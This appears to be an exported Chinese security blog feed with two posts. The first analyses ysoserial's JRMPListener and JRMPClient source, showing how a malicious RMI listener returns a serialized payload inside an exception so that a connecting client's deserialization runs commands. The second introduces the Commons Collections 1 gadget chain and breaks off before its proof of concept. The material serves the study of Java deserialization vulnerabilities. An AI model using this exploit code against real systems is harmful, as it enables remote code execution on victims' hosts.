<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doMessage</span> <span class="params">( Socket s, DataInputStream in, DataOutputStream out, Object payload )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.err.println(<span class="string">&quot;Reading message...&quot;</span>);</span><br><span class="line">    <span class="comment">// 读取一个int，根据这个标志进行操作</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">op</span> <span class="operator">=</span> in.read();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> ( op ) &#123;</span><br><span class="line">    <span class="keyword">case</span> TransportConstants.Call:</span><br><span class="line">        <span class="comment">// service incoming RMI call</span></span><br><span class="line">        <span class="comment">// 进入的是这里</span></span><br><span class="line">        doCall(in, out, payload);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TransportConstants.Ping:</span><br><span class="line">        <span class="comment">// send ack for ping</span></span><br><span class="line">        out.writeByte(TransportConstants.PingAck);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TransportConstants.DGCAck:</span><br><span class="line">        <span class="type">UID</span> <span class="variable">u</span> <span class="operator">=</span> UID.read(in);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;unknown transport op &quot;</span> + op);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入doCall方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doCall</span> <span class="params">( DataInputStream in, DataOutputStream out, Object payload )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 用于从输入流 in 中读取对象，重写了resolveClass方法</span></span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> Class&lt;?&gt; resolveClass ( ObjectStreamClass desc ) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            <span class="keyword">if</span> ( <span class="string">&quot;[Ljava.rmi.server.ObjID;&quot;</span>.equals(desc.getName())) &#123;</span><br><span class="line">                <span class="keyword">return</span> ObjID[].class;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.rmi.server.ObjID&quot;</span>.equals(desc.getName())) &#123;</span><br><span class="line">                <span class="keyword">return</span> ObjID.class;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="string">&quot;java.rmi.server.UID&quot;</span>.equals(desc.getName())) &#123;</span><br><span class="line">                <span class="keyword">return</span> UID.class;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Not allowed to read object&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 使用 ois 从输入流中读取一个 ObjID 对象</span></span><br><span class="line">    ObjID read;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        read = ObjID.read(ois);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( java.io.IOException e ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;unable to read objID&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( read.hashCode() == <span class="number">2</span> ) &#123;</span><br><span class="line">        ois.readInt(); <span class="comment">// method</span></span><br><span class="line">        ois.readLong(); <span class="comment">// hash</span></span><br><span class="line">        System.err.println(<span class="string">&quot;Is DGC call for &quot;</span> + Arrays.toString((ObjID[])ois.readObject()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    System.err.println(<span class="string">&quot;Sending return with payload for obj &quot;</span> + read);</span><br><span class="line">    <span class="comment">//向输出流 out 写入一个字节，表示传输操作为返回操作</span></span><br><span class="line">    out.writeByte(TransportConstants.Return);<span class="comment">// transport op</span></span><br><span class="line">    <span class="comment">// 用于将对象写入输出流 out 中</span></span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JRMPClient</span>.MarshalOutputStream(out, <span class="built_in">this</span>.classpathUrl);</span><br><span class="line">    <span class="comment">// 向 oos 写入一个字节，表示传输操作为异常返回</span></span><br><span class="line">    oos.writeByte(TransportConstants.ExceptionalReturn);</span><br><span class="line">    <span class="comment">// 创建一个新的 UID 对象，并将其写入 oos</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">UID</span>().write(oos);</span><br><span class="line"></span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">    <span class="comment">// 关键在于这里，将payload写入到ex对象的val属性，并写入输出流</span></span><br><span class="line">    Reflections.setFieldValue(ex, <span class="string">&quot;val&quot;</span>, payload);</span><br><span class="line">    oos.writeObject(ex);</span><br><span class="line"></span><br><span class="line">    oos.flush();</span><br><span class="line">    out.flush();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.hadConnection = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">synchronized</span> ( <span class="built_in">this</span>.waitLock ) &#123;</span><br><span class="line">        <span class="built_in">this</span>.waitLock.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后JRMPClient端收到响应的数据</p>
<h2 id="payloads-JRMPClient"><a href="#payloads-JRMPClient" class="headerlink" title="payloads.JRMPClient"></a>payloads.JRMPClient</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PayloadRunner.run(JRMPClient.class, args);</span><br></pre></td></tr></table></figure>

<p>进入run方法<br><strong>第一步：生成payload</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] serialized = <span class="keyword">new</span> <span class="title class_">ExecCheckingSecurityManager</span>().callWrapped(<span class="keyword">new</span> <span class="title class_">Callable</span>&lt;<span class="type">byte</span>[]&gt;()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] call() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> args.length &gt; <span class="number">0</span> &amp;&amp; args[<span class="number">0</span>] != <span class="literal">null</span> ? args[<span class="number">0</span>] : getDefaultTestCmd();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;generating payload object(s) for command: &#x27;&quot;</span> + command + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ObjectPayload&lt;?&gt; payload = clazz.newInstance();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objBefore</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;serializing payload&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] ser = Serializer.serialize(objBefore);</span><br><span class="line">        Utils.releasePayload(payload, objBefore);</span><br><span class="line">        <span class="keyword">return</span> ser;</span><br><span class="line">&#125;&#125;);</span><br></pre></td></tr></table></figure>

<p>这里的clazz是JRMPClient，也就是调用该类的getObject方法获取payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Registry <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 标识远程对象</span></span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    <span class="comment">// 远程对象通信终点</span></span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">    <span class="comment">// 用于处理代理对象的方法调用</span></span><br><span class="line">    <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">    <span class="comment">// 创建代理对象</span></span><br><span class="line">    <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">        Registry.class</span><br><span class="line">    &#125;, obj);</span><br><span class="line">    <span class="keyword">return</span> proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230808224919.png"><br>最后将返回的代理对象进行反序列化<br><strong>第二步：将序列化的payload进行反序列化</strong><br>这一步是测试所用，正常是将payload发送至某个受害主机，让其进行反序列化从而导致命令执行<br>根据payload的构造，反序列化的第一步应该从RemoteObjectInvocationHandler类的readObject方法开始，在该类中没找到readObject方法，进而查看父类RemoteObject的readObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">refClassName</span> <span class="operator">=</span> in.readUTF();</span><br><span class="line">    <span class="keyword">if</span> (refClassName == <span class="literal">null</span> || refClassName.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * No reference class name specified, so construct</span></span><br><span class="line"><span class="comment">            * remote reference from its serialized form.</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">        ref = (RemoteRef) in.readObject();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * Built-in reference class specified, so delegate to</span></span><br><span class="line"><span class="comment">            * internal reference class to initialize its fields from</span></span><br><span class="line"><span class="comment">            * its external form.</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">internalRefClassName</span> <span class="operator">=</span></span><br><span class="line">            RemoteRef.packagePrefix + <span class="string">&quot;.&quot;</span> + refClassName;</span><br><span class="line">        Class&lt;?&gt; refClass = Class.forName(internalRefClassName);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ref = (RemoteRef) refClass.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                * If this step fails, assume we found an internal</span></span><br><span class="line"><span class="comment">                * class that is not meant to be a serializable ref</span></span><br><span class="line"><span class="comment">                * type.</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(internalRefClassName, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(internalRefClassName, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(internalRefClassName, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 进这里</span></span><br><span class="line">        ref.readExternal(in);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230809000955.png"><br>ref是UnicastRef对象，调用其readExternal函数</p>
<blockquote>
<p>当一个类实现了 Externalizable 接口时，它必须实现 readExternal(ObjectInput in) 方法来定义对象的反序列化过程。该方法在对象从输入流进行反序列化时被自动调用，其作用相当于readObject</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="built_in">this</span>.ref = LiveRef.read(var1, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用了LiveRef静态方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title function_">read</span><span class="params">(ObjectInput var0, <span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    TCPEndpoint var2;</span><br><span class="line">    <span class="comment">// 从输入流中读取 TCPEndpoint 对象</span></span><br><span class="line">    <span class="keyword">if</span> (var1) &#123;</span><br><span class="line">        var2 = TCPEndpoint.read(var0);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var2 = TCPEndpoint.readHostPortFormat(var0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">var3</span> <span class="operator">=</span> ObjID.read(var0);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">var4</span> <span class="operator">=</span> var0.readBoolean();</span><br><span class="line">    <span class="type">LiveRef</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(var3, var2, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (var0 <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">        <span class="type">ConnectionInputStream</span> <span class="variable">var6</span> <span class="operator">=</span> (ConnectionInputStream)var0;</span><br><span class="line">        var6.saveRef(var5);</span><br><span class="line">        <span class="keyword">if</span> (var4) &#123;</span><br><span class="line">            var6.setAckNeeded();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 将var5注册到DGCClient中</span></span><br><span class="line">        <span class="comment">// 进入这里</span></span><br><span class="line">        DGCClient.registerRefs(var2, Arrays.asList(var5));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该代码片段的作用是从输入流中读取数据以恢复 LiveRef 对象的状态。它根据不同的条件选择读取不同的数据格式，并在适当的情况下进行注册和标记处理。<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230809103957.png"><br>进入DGCClient类的registerRefs</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">(Endpoint var0, List&lt;LiveRef&gt; var1)</span> &#123;</span><br><span class="line">    EndpointEntry var2;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        var2 = DGCClient.EndpointEntry.lookup(var0);</span><br><span class="line">    &#125; <span class="keyword">while</span>(!var2.registerRefs(var1));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230809111725.png"><br>继续调用DGCClient类的registerRefs，传入一个参数的方法，重点关注语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.makeDirtyCall(var2, var3);</span><br></pre></td></tr></table></figure>

<p>传入的var2是一个HashSet，里面存放的是经过此函数前面代码处理的远程连接对象，var3是下一个用于标识远程对象引用的序列号<br>在makeDirtyCall方法中重点关注</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Lease</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="built_in">this</span>.dgc.dirty(var4, var2, <span class="keyword">new</span> <span class="title class_">Lease</span>(DGCClient.vmid, DGCClient.leaseValue));</span><br></pre></td></tr></table></figure>

<p>在上面提到了dgc是DGCImpl_Stub类，查看该类的dirty方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Lease <span class="title function_">dirty</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个新的 RemoteCall 对象，用于发起远程调用</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取输出流并将参数对象写入</span></span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getOutputStream();</span><br><span class="line">            var6.writeObject(var1);</span><br><span class="line">            var6.writeLong(var2);</span><br><span class="line">            var6.writeObject(var4);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var20) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var20);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 发起远程调用</span></span><br><span class="line">        <span class="built_in">super</span>.ref.invoke(var5);</span><br><span class="line"></span><br><span class="line">        Lease var24;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">var9</span> <span class="operator">=</span> var5.getInputStream();</span><br><span class="line">            var24 = (Lease)var9.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var17) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 完成远程调用</span></span><br><span class="line">            <span class="built_in">super</span>.ref.done(var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (RuntimeException var21) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230809112912.png"><br>这个过程rmi反序列化时RMI client中RegistryImpl_Stub 的实际操作一致<br>首先这里的ref是UnicastRef，调用newCall是与目标服务器进建立通信<br>然后使用invoke处理来自JRMPListener的响应，可以处理来自server端的报错情况，正好通过前面的分析可知，JRMPListener最后将payload包装在异常对象中序列化后写入输出流，JRMPClient对输入流进行反序列化，从而导致payload执行<br>函数调用栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">newCall:<span class="number">340</span>, UnicastRef (sun.rmi.server)</span><br><span class="line">dirty:-<span class="number">1</span>, DGCImpl_Stub (sun.rmi.transport)</span><br><span class="line">makeDirtyCall:<span class="number">378</span>, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:<span class="number">320</span>, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:<span class="number">156</span>, DGCClient (sun.rmi.transport)</span><br><span class="line">read:<span class="number">312</span>, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:<span class="number">493</span>, UnicastRef (sun.rmi.server)</span><br><span class="line">readObject:<span class="number">455</span>, RemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:<span class="number">2000</span>, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:<span class="number">1924</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">deserialize:<span class="number">27</span>, Deserializer (ysoserial)</span><br><span class="line">deserialize:<span class="number">22</span>, Deserializer (ysoserial)</span><br><span class="line">run:<span class="number">38</span>, PayloadRunner (ysoserial.payloads.util)</span><br><span class="line">main:<span class="number">82</span>, JRMPClient (ysoserial.payloads)</span><br></pre></td></tr></table></figure>

<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/2650">ysoserial JRMP相关模块分析（二）- payloads&#x2F;JRMPClient &amp; exploit&#x2F;JRMPListener</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇文章写的有点乱，建议学之前先了解RMI的详细流程及底层代码<br>这里主要分为两种攻击模式，都是基于在rmi底层存在的反序列化的点</p>
<ul>
<li>对服务端的攻击：payloads.JRMPListener+exploit.JRMPClient</li>
<li>对客户端的攻击：exploit.JRMPListener+payloads.JRMPClient</li>
</ul>
<blockquote>
<p>注：本文首发于<a href="https://xz.aliyun.com/t/12780">https://xz.aliyun.com/t/12780</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化之Commons Collections1链</title>
    <url>/2023/01/10/Java-CC1/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>common-collection 3.1版本 jdk1.7版本下的POC复现</p>
<p>在Java 8u71以后的版本中，由于 sun.reflect.annotation.AnnotationInvocationHandler 发生了变化导致不再可用</p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="关于Commons-Collections"><a href="#关于Commons-Collections" class="headerlink" title="关于Commons Collections:"></a><strong>关于Commons Collections:</strong></h2><p>官网描述：</p>
<blockquote>
<p>The <a href="http://docs.oracle.com/javase/tutorial/collections/">Java Collections Framework</a> was a major addition in JDK 1.2. It added many powerful data structures that accelerate development of most significant Java applications. Since that time it has become the recognised standard for collection handling in Java.</p>
</blockquote>
<p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类</p>
<h2 id="关于接口Transformer"><a href="#关于接口Transformer" class="headerlink" title="关于接口Transformer:"></a><strong>关于接口Transformer:</strong></h2><p>在<code>org.apache.commons.collections</code>包中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义为将一个对象转换为另一个对象的类实现的接口函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 接口方法</span></span><br><span class="line"><span class="comment">// 将input对象转化成某个对象输出</span></span><br><span class="line">Object <span class="title function_">transform</span><span class="params">(Object input)</span></span><br></pre></td></tr></table></figure>

<h2 id="关于类ConstantTransformer"><a href="#关于类ConstantTransformer" class="headerlink" title="关于类ConstantTransformer:"></a><strong>关于类ConstantTransformer:</strong></h2><p>在<code>org.apache.commons.collections.functors</code>包中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将输入的对象转换为一个固定的常量对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span></span><br><span class="line"><span class="keyword">extends</span> <span class="title class_">Object</span></span><br><span class="line"><span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 构造方法</span></span><br><span class="line">ConstantTransformer(Object constantToReturn)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类方法</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span></span><br></pre></td></tr></table></figure>

<h2 id="关于类InvokerTransformer"><a href="#关于类InvokerTransformer" class="headerlink" title="关于类InvokerTransformer:"></a><strong>关于类InvokerTransformer:</strong></h2><p>在<code>org.apache.commons.collections.functors</code>包中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过反射调用对象的方法或读取对象的属性来进行转换操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span></span><br><span class="line"><span class="keyword">extends</span> <span class="title class_">Object</span></span><br><span class="line"><span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line">InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 类方法</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span></span><br></pre></td></tr></table></figure>

<h2 id="关于类ChainedTransformer"><a href="#关于类ChainedTransformer" class="headerlink" title="关于类ChainedTransformer:"></a><strong>关于类ChainedTransformer:</strong></h2><p>在<code>org.apache.commons.collections.functors</code>包中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将多个Transformer组合起来，形成一个转换链，依次对输入对象进行转换操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span></span><br><span class="line"><span class="keyword">extends</span> <span class="title class_">Object</span></span><br><span class="line"><span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造方法</span></span><br><span class="line">ChainedTransformer(Transformer[] transformers)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类方法</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span></span><br></pre></td></tr></table></figure>

<h2 id="关于类TransformedMap"><a href="#关于类TransformedMap" class="headerlink" title="关于类TransformedMap:"></a><strong>关于类TransformedMap:</strong></h2><p>在<code>org.apache.commons.collections.map</code>包中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在对Map中的数据进行读取或写入时，自动使用指定的Transformer对数据进行转换操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span></span><br><span class="line"><span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span></span><br><span class="line"><span class="keyword">implements</span> <span class="title class_">Serializable</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 构造方法</span></span><br><span class="line">TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer)</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 类方法</span></span><br><span class="line"><span class="comment">// 创建了一个新的Map对象，它会自动使用该Transformer对读取和写入的数据进行转换操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map,</span></span><br><span class="line"><span class="params">           Transformer keyTransformer,</span></span><br><span class="line"><span class="params">           Transformer valueTransformer)</span></span><br></pre></td></tr></table></figure>



<h1 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h1><p>POC代码：</p>
